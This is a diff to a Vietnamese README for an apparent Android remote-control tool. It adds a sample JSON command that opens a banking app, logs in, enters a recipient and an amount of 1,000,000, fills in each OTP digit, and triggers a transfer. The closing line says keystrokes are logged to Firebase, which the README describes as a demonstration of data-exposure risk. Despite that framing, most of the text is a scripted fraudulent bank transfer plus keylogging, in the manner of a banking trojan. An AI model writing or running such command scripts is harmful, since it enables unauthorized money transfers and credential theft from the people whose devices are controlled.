@@ -124,29 +124,102 @@ Dưới đây là một lệnh JSON mẫu để minh họa khả năng điều k
 
 ```json
 {
+  "type": "EXECUTE_ACTIONS",
   "actions": [
     {
-      "action_type": "open_app",
-      "target_type": "package",
-      "target_value": "com.example.app"
+      "action_type": "OPEN_APP",
+      "target_type": "PACKAGE",
+      "target_value": "com.example.bank"
     },
     {
-      "action_type": "input",
-      "target_type": "id",
-      "target_value": "com.example:id/input_field",
-      "input_text": "test_user"
+      "action_type": "WAIT",
+      "duration_ms": 3000
+    },
+
+    {
+      "action_type": "INPUT",
+      "target_type": "ID",
+      "target_value": "com.example.bank:id/username_input",
+      "input_text": "admin"
     },
     {
-      "action_type": "click",
-      "target_type": "text",
-      "target_value": "Submit"
+      "action_type": "INPUT",
+      "target_type": "ID",
+      "target_value": "com.example.bank:id/password_input",
+      "input_text": "123456"
+    },
+
+    {
+      "action_type": "CLICK",
+      "target_type": "ID",
+      "target_value": "com.example.bank:id/login_button"
     },
     {
-      "action_type": "wait",
-      "duration_ms": 1000
+      "action_type": "WAIT",
+      "duration_ms": 5000
+    },
+    {
+      "action_type": "INPUT",
+      "target_type": "ID",
+      "target_value": "com.example.bank:id/recipient_input",
+      "input_text": "987654321"
+    },
+    {
+      "action_type": "INPUT",
+      "target_type": "ID",
+      "target_value": "com.example.bank:id/amount_input",
+      "input_text": "1000000"
+    },
+    {
+      "action_type": "INPUT",
+      "target_type": "ID",
+      "target_value": "com.example.bank:id/note_input",
+      "input_text": "Chuyển tiền tự động"
+    },
+    {
+      "action_type": "INPUT",
+      "target_type": "ID",
+      "target_value": "com.example.bank:id/otp_1",
+      "input_text": "1"
+    },
+    {
+      "action_type": "INPUT",
+      "target_type": "ID",
+      "target_value": "com.example.bank:id/otp_2",
+      "input_text": "2"
+    },
+    {
+      "action_type": "INPUT",
+      "target_type": "ID",
+      "target_value": "com.example.bank:id/otp_3",
+      "input_text": "3"
+    },
+    {
+      "action_type": "INPUT",
+      "target_type": "ID",
+      "target_value": "com.example.bank:id/otp_4",
+      "input_text": "4"
+    },
+    {
+      "action_type": "INPUT",
+      "target_type": "ID",
+      "target_value": "com.example.bank:id/otp_5",
+      "input_text": "5"
+    },
+    {
+      "action_type": "INPUT",
+      "target_type": "ID",
+      "target_value": "com.example.bank:id/otp_6",
+      "input_text": "6"
+    },
+    {
+      "action_type": "CLICK",
+      "target_type": "ID",
+      "target_value": "com.example.bank:id/transfer_button"
     }
   ]
 }
+
 ```
 
 Trong kịch bản này, ứng dụng mở một ứng dụng, nhập văn bản, nhấp nút và tạm dừng. Các thao tác nhập liệu (keylog) sẽ được gửi về Firebase, minh họa nguy cơ lộ dữ liệu.
